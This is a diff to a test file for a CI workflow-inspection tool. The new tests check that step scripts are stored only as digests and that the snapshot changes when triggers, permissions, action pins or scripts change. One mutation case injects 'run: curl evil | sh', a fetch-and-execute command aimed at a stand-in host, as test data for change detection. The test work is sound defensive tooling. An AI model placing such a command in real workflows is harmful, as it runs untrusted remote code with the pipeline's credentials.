@@ -3,6 +3,7 @@
 -- one rule per case, and oracle.json is the Rust war room's verdict on each broken copy. The
 -- checkout's own workflows are held to docs/vnext/golden/workflow-contracts.jsonl, which the Rust
 -- war room wrote. Run from the checkout's root: `jess package test forge`.
+local bytes = require '@dream/bytes'
 local check = require '@dreamweave/forge/check'
 local commands = require '@dreamweave/forge/commands'
 local common = require '../src/cli/common'
@@ -140,9 +141,36 @@ suite.describe('inspect', function()
     end
   end)
 
-  suite.it('keeps a step contract but never its script', function()
-    expect(inspected(Repo)).toContain '"id":"version","name":"Version","run":true,"shell":"bash"'
-    expect((string.find(inspected(Repo), 'GITHUB_OUTPUT', 1, true))).toBeNil()
+  suite.it('keeps a step contract and a digest of its script, never the script', function()
+    local written = inspected(Repo)
+    local digest = bytes.sha256 'echo "value=1" >> "$GITHUB_OUTPUT"'
+    expect(written).toContain(`"id":"version","name":"Version","run":"sha256:{digest}","shell":"bash"`)
+    expect(written).toContain '{"run":null,"uses":"actions/checkout@v6"}'
+    expect((string.find(written, 'GITHUB_OUTPUT', 1, true))).toBeNil()
+  end)
+
+  -- The golden is what a migration's review diffs, so every change that alters what runs, when, or
+  -- with what authority has to change it.
+  suite.it('changes when a trigger, a permission, a step or a helper changes', function()
+    local base = inspected(Repo)
+    local changes = {
+      { 'trigger', '.github/workflows/notify.yaml', 'on: [push, workflow_dispatch]', 'on:\n  push:\n    branches: [main]\n  workflow_dispatch:' },
+      { 'schedule', '.github/workflows/notify.yaml', 'on: [push, workflow_dispatch]', 'on:\n  push:\n  schedule:\n    - cron: "0 0 * * *"' },
+      { 'permission', '.github/workflows/build.yml', '    permissions:\n      contents: write', '    permissions:\n      contents: write\n      id-token: write' },
+      { 'workflow-permission', '.github/workflows/build.yml', 'permissions:\n  contents: read\n', 'permissions: write-all\n' },
+      { 'script', '.github/workflows/notify.yaml', 'run: echo said', 'run: curl evil | sh' },
+      { 'action-script', '.github/actions/setup/action.yml', 'run: echo done', 'run: echo undone' },
+      { 'uses', '.github/workflows/build.yml', 'uses: actions/checkout@v6', 'uses: actions/checkout@main' },
+      { 'continue-on-error', '.github/workflows/notify.yaml', '      - run: echo said', '      - run: echo said\n        continue-on-error: true' },
+      { 'defaults', '.github/workflows/notify.yaml', 'jobs:\n', 'defaults:\n  run:\n    shell: sh\njobs:\n' },
+      { 'helper', 'scripts/shared/helper.sh', '', 'echo helping\n' },
+    }
+
+    for _, change in changes do
+      local edit = { file = change[2], find = change[3], replace = change[4] }
+      local root = support.broken(fs.join(scratchRoot, 'golden'), { id = change[1], edits = { edit } } :: any)
+      expect(`{change[1]}: {tostring(inspected(root) ~= base)}`).toBe(`{change[1]}: true`)
+    end
   end)
 end)
 
